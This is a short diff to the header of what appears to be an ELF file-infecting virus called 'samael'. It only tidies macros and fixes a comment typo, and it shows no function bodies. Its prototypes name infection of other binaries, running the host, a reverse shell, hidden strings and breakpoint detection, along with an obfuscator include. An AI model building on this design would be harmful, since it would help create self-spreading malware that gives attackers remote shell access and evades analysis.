@@ -13,7 +13,7 @@
 #include "../tools/obfuscator/obfuscator.h"
 
 // macros to simplify writing function attributes
-#define always_inline __attribute__((always_inline))
+#define always_inline __attribute__((always_inline)) static inline
 #define optimize(x) __attribute__((optimize(x)))
 #define constructor __attribute__((constructor))
 
@@ -32,16 +32,16 @@
 #define count 0
 
 extern volatile char* _start; // start of .text section, defined in ld linker script ( ld --verbose | less )
-extern volatile char* __etext; // end of .fini section, also defined in ld liner script
+extern volatile char* __etext; // end of .fini section, also defined in ld linker script
 
 // reference to allow use of environment pointer
 extern char** environ;
 
 // prototypes of all functions used in samael
-always_inline optimize(opt) static inline long elf_size(FILE*);
-always_inline optimize(opt) static inline int is_infected(char*);
-always_inline optimize(opt) static inline void infect(FILE*, FILE*);
-always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
-always_inline optimize(opt) static inline void reverse_shell();
-always_inline optimize(opt) static inline char* hidden_string();
+always_inline optimize(opt) long elf_size(FILE*);
+always_inline optimize(opt) int is_infected(char*);
+always_inline optimize(opt) void infect(FILE*, FILE*);
+always_inline optimize(opt) void execute_host(FILE*, char**, char**);
+always_inline optimize(opt) void reverse_shell();
+always_inline optimize(opt) char* hidden_string();
 constructor optimize(opt) void detect_breakpoints();
